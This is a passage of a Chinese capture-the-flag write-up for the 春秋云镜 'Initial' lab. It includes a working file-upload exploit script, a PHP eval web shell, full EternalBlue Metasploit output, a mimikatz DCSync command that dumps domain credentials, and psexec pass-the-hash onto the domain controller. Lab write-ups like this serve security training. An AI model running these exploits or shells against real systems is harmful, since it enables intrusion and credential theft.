alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e弱口令尝试：\u003ccode\u003eadmin\u003c/code\u003e \u003ccode\u003eadmin123\u003c/code\u003e 可以进入系统…\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e搜索引擎搜索漏洞，可以知道存在文件上传漏洞：\u003ca href=\"https://www.cnblogs.com/Error1s/p/16869854.html\"\u003ehttps://www.cnblogs.com/Error1s/p/16869854.html\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e直接使用脚本来打\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport requests\n\nsession = requests.session()\nurl_pre = \u003cspan class=\"hljs-string\"\u003e'http://172.22.1.18/'\u003c/span\u003e\nurl1 = url_pre + \u003cspan class=\"hljs-string\"\u003e'?a=check\u0026#x26;m=login\u0026#x26;d=\u0026#x26;ajaxbool=true\u0026#x26;rnd=533953'\u003c/span\u003e\nurl2 = url_pre + \u003cspan class=\"hljs-string\"\u003e'/index.php?a=upfile\u0026#x26;m=upload\u0026#x26;d=public\u0026#x26;maxsize=100\u0026#x26;ajaxbool=true\u0026#x26;rnd=798913'\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# url3 = url_pre + '/task.php?m=qcloudCos|runt\u0026#x26;a=run\u0026#x26;fileid=\u0026#x3C;ID\u003e'\u003c/span\u003e\ndata1 = {\n    \u003cspan class=\"hljs-string\"\u003e'rempass'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'jmpass'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'false'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'device'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'1625884034525'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'ltype'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'0'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'adminuser'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'YWRtaW4='\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'adminpass'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'YWRtaW4xMjM='\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'yanzm'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e''\u003c/span\u003e\n}\n\nr = session.post(url1, data=data1)\nr = session.post(url2, files={\u003cspan class=\"hljs-string\"\u003e'file'\u003c/span\u003e: open(\u003cspan class=\"hljs-string\"\u003e'1.php'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'r+'\u003c/span\u003e)})\nfilepath = str(r.json()[\u003cspan class=\"hljs-string\"\u003e'filepath'\u003c/span\u003e])\nfilepath = \u003cspan class=\"hljs-string\"\u003e\"/\"\u003c/span\u003e + filepath.split(\u003cspan class=\"hljs-string\"\u003e'.uptemp'\u003c/span\u003e)[0] + \u003cspan class=\"hljs-string\"\u003e'.php'\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(filepath)\n\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e = r.json()[\u003cspan class=\"hljs-string\"\u003e'id'\u003c/span\u003e]\nurl3 = url_pre + f\u003cspan class=\"hljs-string\"\u003e'/task.php?m=qcloudCos|runt\u0026#x26;a=run\u0026#x26;fileid={id}'\u003c/span\u003e\nr = session.get(url3)\nr = session.get(url_pre + filepath + \u003cspan class=\"hljs-string\"\u003e\"?1=system('dir');\"\u003c/span\u003e)\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(r.text)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003e1.php\u003c/code\u003e和\u003ccode\u003eexp.py\u003c/code\u003e放在同一目录下\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// 1.php\n\u0026#x3C;?php phpinfo();\u003cspan class=\"hljs-built_in\"\u003eeval\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[1]);?\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003e/upload/2025-03/15_14420947.php\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e使用蚁剑连接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e打开虚拟终端查看权限\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e权限是\u003ccode\u003esystem\u003c/code\u003e那么我们能直接找\u003ccode\u003eflag\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eflag02: 2ce3-4813-87d4-\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e提示我们要打域控制器\u003c/p\u003e\n\u003cp\u003e因为我们看到\u003ccode\u003e172.22.1.21\u003c/code\u003e 存在永恒之蓝，先将其拿下，因为它也是域内主机，域控应该是\u003ccode\u003e172.22.1.2\u003c/code\u003e\u003c/p\u003e\n\u003ch2\u003e永恒之蓝\u003c/h2\u003e\n\u003cp\u003e通过MSF梭哈\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  proxychains4 msfconsole                          \n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\nMetasploit tip: View a module\u003cspan class=\"hljs-string\"\u003e's description using info, or the enhanced \nversion in your browser with info -d\n[proxychains] DLL init: proxychains-ng 4.17le.../\n                                                  \n# cowsay++\n ____________\n\u0026#x3C; metasploit \u003e\n ------------\n       \\   ,__,\n        \\  (oo)____\n           (__)    )\\\n              ||--|| *\n\n       =[ metasploit v6.4.34-dev                          ]\n+ -- --=[ 2461 exploits - 1267 auxiliary - 431 post       ]\n+ -- --=[ 1471 payloads - 49 encoders - 11 nops           ]\n+ -- --=[ 9 evasion                                       ]\n\nMetasploit Documentation: https://docs.metasploit.com/\n\n[*] Starting persistent handler(s)...\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\n[proxychains] DLL init: proxychains-ng 4.17\nmsf6 \u003e \nmsf6 \u003e search ms17-010\nmsf6 \u003e use 0\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u003e set rhosts 172.22.1.21\nmsf6 exploit(windows/smb/ms17_010_eternalblue) \u003e set payload windows/x64/meterpreter/bind_tcp_uuid\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e梭！（成功率是真的低）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003emsf6 exploit(windows/smb/ms17_010_eternalblue) \u003e run                                                              \n[proxychains] DLL init: proxychains-ng 4.17                                                                       \n[proxychains] DLL init: proxychains-ng 4.17                                                                       \n                                                                                                                  \n[*] 172.22.1.21:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check\n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK\n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:135  ...  OK\n[+] 172.22.1.21:445       - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)\n[*] 172.22.1.21:445       - Scanned 1 of 1 hosts (100% complete)\n[+] 172.22.1.21:445 - The target is vulnerable.                                                                   \n[*] 172.22.1.21:445 - Connecting to target \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e exploitation.                                          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK                    \n[+] 172.22.1.21:445 - Connection established \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e exploitation.                                        \n[+] 172.22.1.21:445 - Target OS selected valid \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e OS indicated by SMB reply                          \n[*] 172.22.1.21:445 - CORE raw buffer dump (53 bytes)                                                             \n[*] 172.22.1.21:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2   \n[*] 172.22.1.21:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris   \n[*] 172.22.1.21:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P   \n[*] 172.22.1.21:445 - 0x00000030  61 63 6b 20 31                                   ack 1              \n[+] 172.22.1.21:445 - Target \u003cspan class=\"hljs-built_in\"\u003earch\u003c/span\u003e selected valid \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003earch\u003c/span\u003e indicated by DCE/RPC reply\n[*] 172.22.1.21:445 - Trying exploit with 12 Groom Allocations.                             \n[*] 172.22.1.21:445 - Sending all but last fragment of exploit packet                       \n[*] 172.22.1.21:445 - Starting non-paged pool grooming                                                            \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[+] 172.22.1.21:445 - Sending SMBv2 buffers                                                                       \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[+] 172.22.1.21:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. \n[*] 172.22.1.21:445 - Sending final SMBv2 buffers.                                                                \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK          \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK                                \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK                                \n[proxychains] Strict chain  ...  8.134.163.255:1080  ...  172.22.1.21:445  ...  OK                                \n[*] 172.22.1.21:445 - Sending last fragment of exploit packet!                                                    \n[*] 172.22.1.21:445 - Receiving response from exploit packet           \n[+] 172.22.1.21:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!  \n[*] 172.22.1.21:445 - Sending egg to corrupted connection.                        \n[*] 172.22.1.21:445 - Triggering free of corrupted buffer.\n[*] Started \u003cspan class=\"hljs-built_in\"\u003ebind\u003c/span\u003e TCP handler against 172.22.1.21:4444           \n。。。。\n[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                \n[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                \n[+] 172.22.1.21:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=                            \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功查看用户信息\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e加载\u003ccode\u003emimikatz\u003c/code\u003e ，并\u003ccode\u003edump\u003c/code\u003e所有用户密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ekiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以拿到\u003ccode\u003eadministrator\u003c/code\u003e的\u003ccode\u003ehash\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e10cf89a850fb1cdbe6bb432b859164c8\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用psexec打进去即可\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  proxychains4 psexec.py xiaorang.lab/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4\n[proxychains] DLL init: proxychains-ng 4.17\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[proxychains] Strict chain  ...  8.134.163.255:1081  ...  172.22.1.2:445  ...  OK\n[*] Requesting shares on 172.22.1.2.....\n[*] Found writable share ADMIN$\n[*] Uploading file EweiadZn.exe\n[*] Opening SVCManager on 172.22.1.2.....\n[*] Creating service VYGQ on 172.22.1.2.....\n[*] Starting service VYGQ.....\n[proxychains] Strict chain  ...  8.134.163.255:1081  ...  172.22.1.2:445  ...  OK\n[proxychains] Strict chain  ...  8.134.163.255:1081  ...  172.22.1.2:445 [!] Press \u003cspan class=\"hljs-built_in\"\u003ehelp\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e extra shell commands\n ...  OK\n[proxychains] Strict chain  ...  8.134.163.255:1081  ...  172.22.1.2:445  ...  OK\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e execute smbexec.py again with -codec and the corresponding codec\nMicrosoft Windows [�汾 10.0.14393]\n\n[-] Decoding error detected, consider running chcp.com at the target,\nmap the result with https://docs.python.org/3/library/codecs.html#standard-encodings\nand \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e execute smbexec.py again with -codec and the corresponding codec\n(c) 2016 Microsoft Corporation����������Ȩ����\n\nC:\\Windows\\system32\u003e \nC:\\Windows\\system32\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e ..\\..\\Users\\Administrator\\flag\\flag03.txt\n           ___   ___                                                             \n \\\\ / /       / /    // | |     //   ) ) //   ) )  // | |     /|    / / //   ) ) \n  \\  /       / /    //__| |    //   / / //___/ /  //__| |    //|   / / //        \n  / /       / /    / ___  |   //   / / / ___ (   / ___  |   // |  / / //  ____   \n / /\\\\     / /    //    | |  //   / / //   | |  //    | |  //  | / / //    / /   \n/ /  \\\\ __/ /___ //     | | ((___/ / //    | | //     | | //   |/ / ((____/ /    \n\nflag03: e8f88d0d43d6}\n\nUnbelievable! ! You found the last flag, which means you have full control over the entire domain network.\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总的flag\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eflag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e靶机不算难，但是环境不稳定，永恒之蓝成功率太低了，永恒之蓝卡了得有一小时\u003c/p\u003e\n\u003cp\u003e还有就是ew搭建隧道很容易就断开了，并提示\u003ccode\u003eSegmentation faul\u003c/code\u003e，下次试试别的\u003c/p\u003e","title":"春秋云镜 - Initial","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["春秋云镜","Linux靶机","Windows靶机","综合靶场"],"categories":"靶机","description":"Initial https://yunjing.ichunqiu.com/major/detail/1077?type=1 前期踩点 直接使用 fscan 扫描 （靶机IP：39.99.128.239） Thinkphp 5.0.23 RCE 直接扫出来了Thinkphp的rce漏洞，使用工具一把梭..."}},"__N_SSG":true},"page":"/posts/[id]","query":{"id":"春秋云镜Initial"},"buildId":"TnJI9VBCcFHK0DidNwqYO","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>